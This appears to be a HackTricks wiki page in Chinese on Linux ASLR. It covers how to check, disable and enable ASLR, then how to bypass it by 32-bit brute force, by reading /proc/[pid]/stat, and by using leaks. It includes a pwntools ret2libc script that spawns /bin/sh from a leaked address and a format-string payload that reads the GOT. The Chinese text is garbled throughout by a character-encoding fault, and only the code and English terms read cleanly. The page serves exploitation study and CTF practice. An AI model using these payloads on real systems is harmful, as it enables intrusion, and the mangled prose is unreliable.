# ASLR

{% hint style="success" %}
å­¦ä¹ å’Œå®è·µ AWS é»‘å®¢æŠ€æœ¯ï¼š<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks åŸ¹è®­ AWS çº¢é˜Ÿä¸“å®¶ (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
å­¦ä¹ å’Œå®è·µ GCP é»‘å®¢æŠ€æœ¯ï¼š<img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks åŸ¹è®­ GCP çº¢é˜Ÿä¸“å®¶ (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>æ”¯æŒ HackTricks</summary>

* æŸ¥çœ‹ [**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
* **åŠ å…¥** ğŸ’¬ [**Discord ç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**Telegram ç¾¤ç»„**](https://t.me/peass) æˆ– **åœ¨** **Twitter** ğŸ¦ **ä¸Šå…³æ³¨æˆ‘ä»¬** [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub ä»“åº“æäº¤ PR æ¥åˆ†äº«é»‘å®¢æŠ€å·§ã€‚

</details>
{% endhint %}

## åŸºæœ¬ä¿¡æ¯

**åœ°å€ç©ºé—´å¸ƒå±€éšæœºåŒ– (ASLR)** æ˜¯ä¸€ç§åœ¨æ“ä½œç³»ç»Ÿä¸­ä½¿ç”¨çš„å®‰å…¨æŠ€æœ¯ï¼Œç”¨äº **éšæœºåŒ–ç³»ç»Ÿå’Œåº”ç”¨ç¨‹åºè¿›ç¨‹ä½¿ç”¨çš„å†…å­˜åœ°å€**ã€‚é€šè¿‡è¿™æ ·åšï¼Œå®ƒä½¿æ”»å‡»è€…é¢„æµ‹ç‰¹å®šè¿›ç¨‹å’Œæ•°æ®ï¼ˆå¦‚å †æ ˆã€å †å’Œåº“ï¼‰çš„ä½ç½®å˜å¾—æ›´åŠ å›°éš¾ï¼Œä»è€Œå‡è½»æŸäº›ç±»å‹çš„æ¼æ´ï¼Œç‰¹åˆ«æ˜¯ç¼“å†²åŒºæº¢å‡ºã€‚

### **æ£€æŸ¥ ASLR çŠ¶æ€**

è¦ **æ£€æŸ¥** Linux ç³»ç»Ÿä¸Šçš„ ASLR çŠ¶æ€ï¼Œå¯ä»¥ä» `/proc/sys/kernel/randomize_va_space` æ–‡ä»¶ä¸­è¯»å–å€¼ã€‚å­˜å‚¨åœ¨æ­¤æ–‡ä»¶ä¸­çš„å€¼å†³å®šäº†åº”ç”¨çš„ ASLR ç±»å‹ï¼š

* **0**ï¼šæ²¡æœ‰éšæœºåŒ–ã€‚ä¸€åˆ‡éƒ½æ˜¯é™æ€çš„ã€‚
* **1**ï¼šä¿å®ˆéšæœºåŒ–ã€‚å…±äº«åº“ã€å †æ ˆã€mmap()ã€VDSO é¡µé¢è¢«éšæœºåŒ–ã€‚
* **2**ï¼šå®Œå…¨éšæœºåŒ–ã€‚é™¤äº†ä¿å®ˆéšæœºåŒ–éšæœºåŒ–çš„å…ƒç´ å¤–ï¼Œé€šè¿‡ `brk()` ç®¡ç†çš„å†…å­˜ä¹Ÿè¢«éšæœºåŒ–ã€‚

æ‚¨å¯ä»¥ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤æ£€æŸ¥ ASLR çŠ¶æ€ï¼š
```bash
cat /proc/sys/kernel/randomize_va_space
```
### **ç¦ç”¨ ASLR**

è¦**ç¦ç”¨** ASLRï¼Œæ‚¨éœ€è¦å°† `/proc/sys/kernel/randomize_va_space` çš„å€¼è®¾ç½®ä¸º **0**ã€‚åœ¨æµ‹è¯•æˆ–è°ƒè¯•åœºæ™¯ä¹‹å¤–ï¼Œé€šå¸¸ä¸å»ºè®®ç¦ç”¨ ASLRã€‚ä»¥ä¸‹æ˜¯ç¦ç”¨å®ƒçš„æ–¹æ³•ï¼š
```bash
echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
```
æ‚¨è¿˜å¯ä»¥é€šè¿‡ä»¥ä¸‹æ–¹å¼ç¦ç”¨ASLRæ‰§è¡Œï¼š
```bash
setarch `arch` -R ./bin args
setarch `uname -m` -R ./bin args
```
### **å¯ç”¨ ASLR**

è¦**å¯ç”¨** ASLRï¼Œæ‚¨å¯ä»¥å°†å€¼ **2** å†™å…¥ `/proc/sys/kernel/randomize_va_space` æ–‡ä»¶ã€‚è¿™é€šå¸¸éœ€è¦ root æƒé™ã€‚å¯ä»¥ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤å¯ç”¨å®Œå…¨éšæœºåŒ–ï¼š
```bash
echo 2 | sudo tee /proc/sys/kernel/randomize_va_space
```
### **é‡å¯åçš„æŒä¹…æ€§**

ä½¿ç”¨ `echo` å‘½ä»¤æ‰€åšçš„æ›´æ”¹æ˜¯ä¸´æ—¶çš„ï¼Œå¹¶å°†åœ¨é‡å¯æ—¶é‡ç½®ã€‚è¦ä½¿æ›´æ”¹æŒä¹…åŒ–ï¼Œæ‚¨éœ€è¦ç¼–è¾‘ `/etc/sysctl.conf` æ–‡ä»¶ï¼Œå¹¶æ·»åŠ æˆ–ä¿®æ”¹ä»¥ä¸‹è¡Œï¼š
```tsconfig
kernel.randomize_va_space=2 # Enable ASLR
# or
kernel.randomize_va_space=0 # Disable ASLR
```
åœ¨ç¼–è¾‘ `/etc/sysctl.conf` åï¼Œä½¿ç”¨ä»¥ä¸‹å‘½ä»¤åº”ç”¨æ›´æ”¹ï¼š
```bash
sudo sysctl -p
```
è¿™å°†ç¡®ä¿æ‚¨çš„ ASLR è®¾ç½®åœ¨é‡å¯åä¿æŒä¸å˜ã€‚

## **ç»•è¿‡**

### 32ä½æš´åŠ›ç ´è§£

PaX å°†è¿›ç¨‹åœ°å€ç©ºé—´åˆ†ä¸º **3 ç»„**ï¼š

* **ä»£ç å’Œæ•°æ®**ï¼ˆå·²åˆå§‹åŒ–å’Œæœªåˆå§‹åŒ–ï¼‰ï¼š`.text`ã€`.data` å’Œ `.bss` â€”> `delta_exec` å˜é‡ä¸­æœ‰ **16 ä½** çš„ç†µã€‚è¯¥å˜é‡åœ¨æ¯ä¸ªè¿›ç¨‹ä¸­éšæœºåˆå§‹åŒ–ï¼Œå¹¶æ·»åŠ åˆ°åˆå§‹åœ°å€ã€‚
* é€šè¿‡ `mmap()` åˆ†é…çš„ **å†…å­˜** å’Œ **å…±äº«åº“** â€”> **16 ä½**ï¼Œç§°ä¸º `delta_mmap`ã€‚
* **æ ˆ** â€”> **24 ä½**ï¼Œç§°ä¸º `delta_stack`ã€‚ç„¶è€Œï¼Œå®ƒå®é™…ä¸Šä½¿ç”¨ **11 ä½**ï¼ˆä»ç¬¬ 10 å­—èŠ‚åˆ°ç¬¬ 20 å­—èŠ‚ï¼ŒåŒ…æ‹¬ï¼‰ï¼Œå¯¹é½åˆ° **16 å­—èŠ‚** â€”> è¿™å¯¼è‡´ **524,288 ä¸ªå¯èƒ½çš„çœŸå®æ ˆåœ°å€**ã€‚

å‰é¢çš„æ•°æ®é€‚ç”¨äº 32 ä½ç³»ç»Ÿï¼Œå‡å°‘çš„æœ€ç»ˆç†µä½¿å¾—é€šè¿‡ä¸€æ¬¡åˆä¸€æ¬¡åœ°é‡è¯•æ‰§è¡Œæ¥ç»•è¿‡ ASLR æˆä¸ºå¯èƒ½ï¼Œç›´åˆ°åˆ©ç”¨æˆåŠŸå®Œæˆã€‚

#### æš´åŠ›ç ´è§£æ€è·¯ï¼š

* å¦‚æœæ‚¨æœ‰è¶³å¤Ÿå¤§çš„æº¢å‡ºä»¥å®¹çº³ **å¤§ NOP æ»‘é“åœ¨ shellcode ä¹‹å‰**ï¼Œæ‚¨å¯ä»¥åœ¨æ ˆä¸­æš´åŠ›ç ´è§£åœ°å€ï¼Œç›´åˆ°æµç¨‹ **è·³è¿‡ NOP æ»‘é“çš„æŸéƒ¨åˆ†**ã€‚
* å¦‚æœæº¢å‡ºä¸å¤§ï¼Œå¹¶ä¸”åˆ©ç”¨å¯ä»¥åœ¨æœ¬åœ°è¿è¡Œï¼Œå¦ä¸€ç§é€‰æ‹©æ˜¯ **åœ¨ç¯å¢ƒå˜é‡ä¸­æ·»åŠ  NOP æ»‘é“å’Œ shellcode**ã€‚
* å¦‚æœåˆ©ç”¨æ˜¯æœ¬åœ°çš„ï¼Œæ‚¨å¯ä»¥å°è¯•æš´åŠ›ç ´è§£ libc çš„åŸºåœ°å€ï¼ˆå¯¹ 32 ä½ç³»ç»Ÿæœ‰ç”¨ï¼‰ï¼š
```python
for off in range(0xb7000000, 0xb8000000, 0x1000):
```
* å¦‚æœæ”»å‡»è¿œç¨‹æœåŠ¡å™¨ï¼Œæ‚¨å¯ä»¥å°è¯•**æš´åŠ›ç ´è§£`libc`å‡½æ•°`usleep`çš„åœ°å€**ï¼Œä¼ é€’å‚æ•°10ï¼ˆä¾‹å¦‚ï¼‰ã€‚å¦‚æœåœ¨æŸä¸ªæ—¶åˆ»**æœåŠ¡å™¨å“åº”å¤šäº†10ç§’**ï¼Œæ‚¨æ‰¾åˆ°äº†è¯¥å‡½æ•°çš„åœ°å€ã€‚

{% hint style="success" %}
åœ¨64ä½ç³»ç»Ÿä¸­ï¼Œç†µè¦é«˜å¾—å¤šï¼Œè¿™æ ·æ˜¯ä¸å¯èƒ½çš„ã€‚
{% endhint %}

### æœ¬åœ°ä¿¡æ¯ (`/proc/[pid]/stat`)

è¿›ç¨‹çš„æ–‡ä»¶**`/proc/[pid]/stat`**å§‹ç»ˆå¯¹æ‰€æœ‰äººå¯è¯»ï¼Œå¹¶ä¸”**åŒ…å«æœ‰è¶£çš„**ä¿¡æ¯ï¼Œä¾‹å¦‚ï¼š

* **startcode** & **endcode**ï¼šäºŒè¿›åˆ¶æ–‡ä»¶**TEXT**çš„ä¸Šä¸‹åœ°å€
* **startstack**ï¼š**æ ˆ**çš„èµ·å§‹åœ°å€
* **start\_data** & **end\_data**ï¼š**BSS**çš„ä¸Šä¸‹åœ°å€
* **kstkesp** & **kstkeip**ï¼šå½“å‰**ESP**å’Œ**EIP**åœ°å€
* **arg\_start** & **arg\_end**ï¼š**cliå‚æ•°**çš„ä¸Šä¸‹åœ°å€
* **env\_start** & **env\_end**ï¼š**ç¯å¢ƒå˜é‡**çš„ä¸Šä¸‹åœ°å€

å› æ­¤ï¼Œå¦‚æœæ”»å‡»è€…ä¸è¢«åˆ©ç”¨çš„äºŒè¿›åˆ¶æ–‡ä»¶åœ¨åŒä¸€å°è®¡ç®—æœºä¸Šï¼Œå¹¶ä¸”è¯¥äºŒè¿›åˆ¶æ–‡ä»¶ä¸æœŸæœ›æ¥è‡ªåŸå§‹å‚æ•°çš„æº¢å‡ºï¼Œè€Œæ˜¯æ¥è‡ªè¯»å–æ­¤æ–‡ä»¶åå¯ä»¥æ„é€ çš„ä¸åŒ**è¾“å…¥**ã€‚æ”»å‡»è€…å¯ä»¥**ä»æ­¤æ–‡ä»¶ä¸­è·å–ä¸€äº›åœ°å€å¹¶ä»ä¸­æ„é€ åç§»é‡ä»¥è¿›è¡Œåˆ©ç”¨**ã€‚

{% hint style="success" %}
æœ‰å…³æ­¤æ–‡ä»¶çš„æ›´å¤šä¿¡æ¯ï¼Œè¯·æŸ¥çœ‹[https://man7.org/linux/man-pages/man5/proc.5.html](https://man7.org/linux/man-pages/man5/proc.5.html)ï¼Œæœç´¢`/proc/pid/stat`
{% endhint %}

### æ‹¥æœ‰ä¸€ä¸ªæ³„æ¼

* **æŒ‘æˆ˜åœ¨äºæä¾›ä¸€ä¸ªæ³„æ¼**

å¦‚æœæ‚¨è·å¾—äº†ä¸€ä¸ªæ³„æ¼ï¼ˆç®€å•çš„CTFæŒ‘æˆ˜ï¼‰ï¼Œæ‚¨å¯ä»¥ä»ä¸­è®¡ç®—åç§»é‡ï¼ˆå‡è®¾ä¾‹å¦‚æ‚¨çŸ¥é“æ‚¨æ­£åœ¨åˆ©ç”¨çš„ç³»ç»Ÿä¸­ä½¿ç”¨çš„ç¡®åˆ‡libcç‰ˆæœ¬ï¼‰ã€‚è¿™ä¸ªç¤ºä¾‹åˆ©ç”¨æå–è‡ª[**è¿™é‡Œçš„ç¤ºä¾‹**](https://ir0nstone.gitbook.io/notes/types/stack/aslr/aslr-bypass-with-given-leak)ï¼ˆæŸ¥çœ‹è¯¥é¡µé¢ä»¥è·å–æ›´å¤šè¯¦ç»†ä¿¡æ¯ï¼‰ï¼š
```python
from pwn import *

elf = context.binary = ELF('./vuln-32')
libc = elf.libc
p = process()

p.recvuntil('at: ')
system_leak = int(p.recvline(), 16)

libc.address = system_leak - libc.sym['system']
log.success(f'LIBC base: {hex(libc.address)}')

payload = flat(
'A' * 32,
libc.sym['system'],
0x0,        # return address
next(libc.search(b'/bin/sh'))
)

p.sendline(payload)

p.interactive()
```
* **ret2plt**

åˆ©ç”¨ç¼“å†²åŒºæº¢å‡ºï¼Œå¯ä»¥åˆ©ç”¨ **ret2plt** ä» libc ä¸­æå–ä¸€ä¸ªå‡½æ•°çš„åœ°å€ã€‚æ£€æŸ¥ï¼š

{% content-ref url="ret2plt.md" %}
[ret2plt.md](ret2plt.md)
{% endcontent-ref %}

* **æ ¼å¼å­—ç¬¦ä¸²ä»»æ„è¯»å–**

å°±åƒåœ¨ ret2plt ä¸­ä¸€æ ·ï¼Œå¦‚æœé€šè¿‡æ ¼å¼å­—ç¬¦ä¸²æ¼æ´æœ‰ä»»æ„è¯»å–çš„èƒ½åŠ›ï¼Œå¯ä»¥ä» GOT ä¸­æå– **libc å‡½æ•°** çš„åœ°å€ã€‚ä»¥ä¸‹ [**ç¤ºä¾‹æ¥è‡ªè¿™é‡Œ**](https://ir0nstone.gitbook.io/notes/types/stack/aslr/plt\_and\_got):
```python
payload = p32(elf.got['puts'])  # p64() if 64-bit
payload += b'|'
payload += b'%3$s'              # The third parameter points at the start of the buffer

# this part is only relevant if you need to call the main function again

payload = payload.ljust(40, b'A')   # 40 is the offset until you're overwriting the instruction pointer
payload += p32(elf.symbols['main'])
```
æ‚¨å¯ä»¥åœ¨ä»¥ä¸‹ä½ç½®æ‰¾åˆ°æœ‰å…³æ ¼å¼å­—ç¬¦ä¸²ä»»æ„è¯»å–çš„æ›´å¤šä¿¡æ¯ï¼š

{% content-ref url="../../format-strings/" %}
[format-strings](../../format-strings/)
{% endcontent-ref %}

### Ret2ret & Ret2pop

å°è¯•é€šè¿‡åˆ©ç”¨æ ˆå†…çš„åœ°å€æ¥ç»•è¿‡ ASLRï¼š

{% content-ref url="../../stack-overflow/ret2ret.md" %}
[ret2ret.md](../../stack-overflow/ret2ret.md)
{% endcontent-ref %}

{% hint style="success" %}
å­¦ä¹ å’Œå®è·µ AWS é»‘å®¢æŠ€æœ¯ï¼š<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks åŸ¹è®­ AWS çº¢é˜Ÿä¸“å®¶ (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
å­¦ä¹ å’Œå®è·µ GCP é»‘å®¢æŠ€æœ¯ï¼š<img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks åŸ¹è®­ GCP çº¢é˜Ÿä¸“å®¶ (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>æ”¯æŒ HackTricks</summary>

* æŸ¥çœ‹ [**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
* **åŠ å…¥** ğŸ’¬ [**Discord ç¾¤ç»„**](https://discord.gg/hRep4RUj7f) æˆ– [**Telegram ç¾¤ç»„**](https://t.me/peass) æˆ– **åœ¨ Twitter ä¸Šå…³æ³¨** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **é€šè¿‡å‘** [**HackTricks**](https://github.com/carlospolop/hacktricks) å’Œ [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) GitHub ä»“åº“æäº¤ PR æ¥åˆ†äº«é»‘å®¢æŠ€å·§ã€‚

</details>
{% endhint %}
